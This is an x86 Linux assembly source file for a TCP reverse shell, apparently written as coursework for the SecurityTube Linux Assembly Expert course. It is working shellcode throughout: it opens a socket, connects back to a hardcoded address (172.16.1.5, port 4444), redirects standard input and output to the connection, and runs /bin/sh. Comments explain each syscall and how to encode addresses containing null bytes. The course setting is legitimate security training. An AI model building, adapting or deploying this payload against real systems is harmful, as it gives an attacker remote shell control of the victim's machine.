; Simple x86 Linux TCP Reverse Shell
; Author: @fbcsec
; This code was written to fulfill the requirements of the SecurityTube Linux Assembly Expert course:
; http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/index.html
; Student ID: SLAE - 1187

global _start

section .text

_start:

    xor ebx, ebx
    mul ebx

; socket(AF_INET, SOCK_STREAM, 0)
    push eax
    inc ebx
    push ebx
    push byte 0x02
    mov ecx, esp
    mov al, 0x66
    int 0x80
; A file descriptor for this socket is returned in EAX.

; connect(fd, *sockaddr, addrlen (0x10))


    pop edi             ; EDI is now 0x02
    xchg edi, eax       ; sockfd is now in edi
    xchg ebx, eax       ; EAX now contains 0x00000002 (all but al is zero)
    mov al, 0x66        ; EAX now contains 0x00000066
                        ; This block is because we can't predict the file descriptor returned in EAX and must ensure all of EAX's bytes higher than AL are zeroed.


; Now we build a sockaddr struct representing the IP address and port we want to connect back to.

    push 0x050110ac  ; Push destination IP address, in this case 172.16.1.5

        ; If you need to connect back to an IP with a null byte in it (i.e. one of the octets is zero, such as 10.0.0.5) we need to do extra legwork to push the IP address

        ; for example to use 10.0.0.5:
        ;   add dh, 0x05
        ;   push word dx
        ;   xor edx edx
        ;   add dl, 0xa
        ;   push word dx
        ;   xor edx edx

        ; This will result in this dword being on the stack: 0x0500000a, when we examine a pointer to it byte by byte it is read as 0x0a, 0x00, 0x00, 0x05, our destination IP address.

    push word 0x5c11 ; push port number
    push word bx     ; push 0x02

    inc ebx          ; connect(2)'s socket call id is 3, so we bump ebx up one.
    mov ecx, esp     ; save address to struct in ecx


; And now set up the connect(2) socketcall. Its arguments are identical to bind(2) from our bind shell.
    push 0x10
    push ecx
    push edi
    mov ecx, esp
    int 0x80

; This should return zero, we will continue using the file descriptor from our initial socket(2) call.


; dup2(connection_fd, fd_to_redirect)

    pop ebx             ; A new file descriptor is not returned so must POP the one we've got initially off the stack.
    mov ecx, edx        ; from here on out it's identical to our previous bindshell payload.
    mov cl, 0x02

dup2_loop:
    xor eax, eax
    mov al, 0x3f
    int 0x80
    dec ecx
    jns dup2_loop

; execve /bin/sh

    push edx
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp
    push edx
    mov edx, esp
    push ebx
    mov ecx, esp
    mov al, 0x0b
    int 0x80

